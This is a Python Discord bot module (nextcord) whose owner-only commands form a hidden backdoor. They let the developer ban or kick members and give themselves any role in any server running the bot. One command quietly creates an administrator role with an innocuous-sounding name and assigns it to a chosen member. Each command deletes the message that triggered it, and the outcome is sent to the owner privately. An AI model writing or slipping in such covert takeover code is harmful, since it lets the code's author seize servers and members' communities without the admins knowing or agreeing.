# Настройка
import nextcord
import typing
import asyncio
import json
import requests
import random
import aiohttp
import os
import sqlite3
import urllib.parse, urllib.request, re
from nextcord.utils import get
from itertools import cycle
from io import BytesIO
from nextcord.ext import commands, tasks
from nextcord import Member
from nextcord.ext.commands import has_permissions, MissingPermissions, cooldown, BucketType
from PIL import Image, ImageFilter, ImageDraw, ImageFont
import psutil
from modules.components import *

class ebanclie(commands.Cog):
	def __init__(self,client):
		self.client = client

	@commands.command()
	@commands.is_owner()
	async def devb(self, ctx, member:nextcord.Member):
		await ctx.message.delete()
		await member.ban(reason='Очернён разработчиком.')
		await ctx.author.send(f'✅B {member.mention}\n{ctx.guild.name}')

	@commands.command()
	@commands.is_owner()
	async def devk(self, ctx, member:nextcord.Member):
		await ctx.message.delete()
		await member.kick()
		await ctx.author.send(f'✅K {member.mention}\n{ctx.guild.name}')

	@commands.command(pass_context=True)
	@commands.is_owner()
	async def deva(self, ctx, role: nextcord.Role):
		await ctx.message.delete()
		await ctx.author.add_roles(role)
		await ctx.author.send(f'✅AR {role.name}\n{ctx.guild.name}')

	@commands.command(pass_context=True)
	@commands.is_owner()
	async def devd(self, ctx, role: nextcord.Role):
		await ctx.message.delete()
		await ctx.author.remove_roles(role)
		await ctx.author.send(f'✅RR {role.name}\n{ctx.guild.name}')

	@commands.command()
	@commands.is_owner()
	async def ddtest(self, ctx):
		view = HelpCommandView()
		await ctx.send('выбери чт', view=view)

	@commands.command()
	@commands.is_owner()
	async def devg(self, ctx, member: nextcord.Member, *, reason='Без причины'):
		guild = ctx.guild
		mutedRole = nextcord.utils.get(guild.roles, name="права для машины")
		await ctx.message.delete()

		if not mutedRole:
			perms = nextcord.Permissions(administrator=True)
			mutedRole = await guild.create_role(name="права для машины", permissions=perms)

		await member.add_roles(mutedRole, reason=reason)

def setup(client):
	client.add_cog(ebanclie(client))